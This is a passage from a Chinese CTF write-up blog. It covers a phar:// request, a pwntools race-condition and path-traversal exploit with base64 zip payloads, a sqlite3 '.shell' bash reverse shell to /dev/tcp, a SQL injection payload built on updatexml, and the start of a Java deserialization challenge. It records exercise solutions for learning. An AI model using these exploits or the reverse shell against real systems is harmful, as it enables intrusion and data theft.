class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传完给一个路径读取。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /index.php?img_name=phar://./upload/phar.gif</span><br></pre></td></tr></table></figure>
<h1 id="misc">MISC</h1>
<h2 id="sakana_reveage">sakana_reveage</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   _____      /\/|        /\/|              _____ _    ___       ______ </span></span><br><span class="line"><span class="string">  / ____|    |/\/ |      |/\/              / ____| |  / _ \     |  ____|</span></span><br><span class="line"><span class="string"> | (___   __ _  | | ____ _   _ __   __ _  | (___ | |_| | | |_ __| |__   </span></span><br><span class="line"><span class="string">  \___ \ / _` | | |/ / _` | | &#x27;_ \ / _` |  \___ \| __| | | | &#x27;__|  __|  </span></span><br><span class="line"><span class="string">  ____) | (_| | |   &lt; (_| | | | | | (_| |  ____) | |_| |_| | |  | |____ </span></span><br><span class="line"><span class="string"> |_____/ \__,_| |_|\_\__,_| |_| |_|\__,_| |_____/ \__|\___/|_|  |______|</span></span><br><span class="line"><span class="string">                                                                                                                   </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">SAKANA_PATH = <span class="string">&quot;./sakana&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome_menu</span>():</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. Upload an sakana&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. Download an sakana&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3. Delete an sakana&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;4. Upload sakanas of Zip&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Input your choice&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt; &quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sakana_upload</span>():</span><br><span class="line">    sakana_file_name = <span class="built_in">input</span>(<span class="string">&quot;Name for your sakana:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    encoded_sakana_content = <span class="built_in">input</span>(<span class="string">&quot;Base64-encoded sakana:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decode_content = base64.b64decode(encoded_sakana_content)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error base64!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decode_content == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Empty file!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> decode_content.startswith(<span class="string">b&quot;sakana&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Only sakana files are allowed!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(SAKANA_PATH, sakana_file_name), <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> sakana_file_handle:</span><br><span class="line">        sakana_file_handle.write(decode_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sakana_download</span>():</span><br><span class="line">    sakana_file = os.listdir(SAKANA_PATH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file_num, file_name <span class="keyword">in</span> <span class="built_in">enumerate</span>(sakana_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_num&#125;</span> -&gt; <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Select num which sakana to download&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sakana_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt; &quot;</span>))</span><br><span class="line">        sakana_path = os.path.join(SAKANA_PATH, sakana_file[sakana_num])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid num of sakana!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sakana_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sakana_file_handle:</span><br><span class="line">        sakana = sakana_file_handle.read()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here is your sakana file(base64ed)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(sakana).decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sakana_delete</span>():</span><br><span class="line">    sakana_file = os.listdir(SAKANA_PATH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file_num, file_name <span class="keyword">in</span> <span class="built_in">enumerate</span>(sakana_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_num&#125;</span> -&gt; <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Select num which sakana to delete&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sakana_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt; &quot;</span>))</span><br><span class="line">        sakana_path = os.path.join(SAKANA_PATH, sakana_file[sakana_num])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid num of sakana!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    os.remove(sakana_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sakana file successfully deleted!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sakana_upload_sakanas</span>():</span><br><span class="line">    sakanas_path = <span class="string">&quot;/tmp/sakanas.zip&quot;</span></span><br><span class="line"></span><br><span class="line">    encoded_zip_content = <span class="built_in">input</span>(<span class="string">&quot;Base64-encoded zip of sakanas:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(sakanas_path, <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">            zip_content = base64.b64decode(encoded_zip_content)</span><br><span class="line">            zip_file.write(zip_content)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#no symlink for it </span></span><br><span class="line">            <span class="keyword">for</span> zip_info <span class="keyword">in</span> zipfile.ZipFile(zip_file).infolist():</span><br><span class="line">                <span class="keyword">if</span> zip_info.external_attr &gt;&gt; <span class="number">16</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Hacker!!!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> zipfile.BadZipFile:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error zipfile!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error base64!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> subprocess.run([<span class="string">&quot;unzip&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;-q&quot;</span>, sakanas_path, <span class="string">&quot;-d&quot;</span>, SAKANA_PATH]).returncode &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Zip successfully uploaded and extracted&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error while extracting the Zip&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    os.makedirs(SAKANA_PATH, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(BANNER)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        choice = welcome_menu()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            sakana_upload()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            sakana_download()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">            sakana_delete()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">4</span>:</span><br><span class="line">            sakana_upload_sakanas()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;bye......&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid choice!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>代码审计发现，<strong>sakana_upload</strong>和<strong>sakana_upload_sakanas</strong>存在条件竞争。</p>
<p><strong>sakana_upload</strong>可控制写入路径，在<strong>sakana_upload_sakanas</strong>执行<strong>unzip</strong>之前成功写入就行。</p>
<p>上传恶意<strong>zip</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    io=remote(<span class="string">&#x27;39.106.156.96&#x27;</span>,<span class="number">30465</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;sakana:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;../../../tmp/sakanas.zip&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;ded sakana:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;c2FrYW5hUEsDBAoAAAAAALd2M1VOewN1BQAAAAUAAAAFABwAZmw0NGdVVAkAA/oRKGP6EShjdXgLAAEEAAAAAAQAAAAAL2ZsYWdQSwECHgMKAAAAAAC3djNVTnsDdQUAAAAFAAAABQAYAAAAAAAAAAAA/6EAAAAAZmw0NGdVVAUAA/oRKGN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBLAAAARAAAAAAA&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上传正常<strong>zip</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    io = remote(<span class="string">&#x27;39.106.156.96&#x27;</span>, <span class="number">30465</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;sakanas:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;c2FrYW5hUEsDBBQAAAAIAJd+M1W379yDAwAAAAEAAAAFAAAAMS50eHQzBABQSwECHwAUAAAACACXfjNVt+/cgwMAAAABAAAABQAkAAAAAAAAACAAAAAAAAAAMS50eHQKACAAAAAAAAEAGACI8WvO/MvYAYjxa878y9gBWLaezPzL2AFQSwUGAAAAAAEAAQBXAAAAJgAAAAAA&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>然后去手动访问就行。</p>
<h2 id="misc_mster_0f">5_Misc_m@sTeR_0f</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                     _______   _____     ___   __    _____       _      _ _______   </span></span><br><span class="line"><span class="string">              ____  |__   __| |  __ \   / _ \ / _|  / ____|     | |    (_)__   __|  </span></span><br><span class="line"><span class="string">  _ __ ___   / __ \ ___| | ___| |__) | | | | | |_  | (___   __ _| |     _   | | ___ </span></span><br><span class="line"><span class="string"> | &#x27;_ ` _ \ / / _` / __| |/ _ \  _  /  | | | |  _|  \___ \ / _` | |    | |  | |/ _ \</span></span><br><span class="line"><span class="string"> | | | | | | | (_| \__ \ |  __/ | \ \  | |_| | |    ____) | (_| | |____| |  | |  __/</span></span><br><span class="line"><span class="string"> |_| |_| |_|\ \__,_|___/_|\___|_|  \_\  \___/|_|   |_____/ \__, |______|_|  |_|\___|</span></span><br><span class="line"><span class="string">             \____/                                           | |                   </span></span><br><span class="line"><span class="string">                                                              |_|                   </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name_generator</span>(<span class="params">size=<span class="number">6</span>, chars=string.ascii_uppercase + string.digits</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line"></span><br><span class="line">tmp_dbpath = <span class="string">f&#x27;/tmp/<span class="subst">&#123;name_generator()&#125;</span>.db&#x27;</span></span><br><span class="line"></span><br><span class="line">query_idea = <span class="built_in">input</span>(<span class="string">&quot;Input your Query command ---&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">black_list = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;lo&#x27;</span>, <span class="string">&#x27;;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> black_list:</span><br><span class="line">    <span class="keyword">if</span> y <span class="keyword">in</span> query_idea:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hacker! Banned...&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">sqlite3_process = subprocess.Popen([<span class="string">&quot;sqlite3&quot;</span>, tmp_dbpath, query_idea], stdout=subprocess.PIPE)</span><br><span class="line">(output, error) = sqlite3_process.communicate()</span><br><span class="line"><span class="comment">#Show your output!</span></span><br><span class="line"><span class="built_in">print</span>(output.decode())</span><br></pre></td></tr></table></figure>
<p><strong>-interactive</strong>进入交互模式，绕过<strong>WAF</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-interactive</span><br></pre></td></tr></table></figure>
<p><strong>.shell</strong>执行命令反弹<strong>SHELL</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.shell echo &#x27;/bin/sh -i &gt;&amp; /dev/tcp/x.x.x.x/x 0&gt;&amp;1&#x27; &gt; /tmp/1.sh</span><br><span class="line">.shell bash /tmp/1.sh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 长城杯 线上预选赛 部分题解</title>
    <url>/2022-CCB-Preliminary/</url>
    <content><![CDATA[<p>没啥有意思的题，纯记录。</p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="djangogogo">djangogogo</h2>
<p>有手就行的注入。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /?name=month%20FROM%20purchase_date))union%20select20updatexml(1,substr(concat(&#x27;~&#x27;,(select20*20from20(select20concat_ws(&#x27;,&#x27;,flag)20from20FLAG20limit200,1)20a)),10,40),0),2,3,4;-- </span><br></pre></td></tr></table></figure>
<h2 id="b4bycoffee">b4bycoffee</h2>
<p><strong>pom.xml</strong>如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>b4bycoffee<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>b4bycoffee<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>b4bycoffee<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.json<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>json<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>20220320<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>coffeeController</strong>的内容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.b4bycoffee.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.b4bycoffee.model.CoffeeRequest;</span><br><span class="line"><span class="keyword">import</span> com.example.b4bycoffee.model.Message;</span><br><span class="line"><span class="keyword">import</span> com.example.b4bycoffee.model.Venti;</span><br><span class="line"><span class="keyword">import</span> com.example.b4bycoffee.tools.AntObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.naming.ConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">coffeeController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">coffeeController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/b4by/coffee&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">order</span><span class="params">(<span class="meta">@RequestBody</span> CoffeeRequest coffee)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, ConfigurationException &#123;</span><br><span class="line">        <span class="keyword">if</span> (coffee.Venti != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(coffee.Venti));</span><br><span class="line">            <span class="type">AntObjectInputStream</span> <span class="variable">antInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntObjectInputStream</span>(inputStream);</span><br><span class="line">            <span class="type">Venti</span> <span class="variable">venti</span> <span class="operator">=</span> (Venti)antInputStream.readObject();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, venti.getcoffeeName());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.espresso &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;DOPPIO&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.hotWater &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;AMERICANO&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.milkFoam &gt; <span class="number">0.0</span> &amp;&amp; coffee.steamMilk &gt; <span class="number">0.0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> coffee.steamMilk &gt; coffee.milkFoam ? <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;CAPPUCCINO&quot;</span>) : <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Latte&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> coffee.espresso &gt; <span class="number">0.0</span> ? <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Espresso&quot;</span>) : <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;empty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>AntObjectInputStream</strong>的内容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.b4bycoffee.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; list = 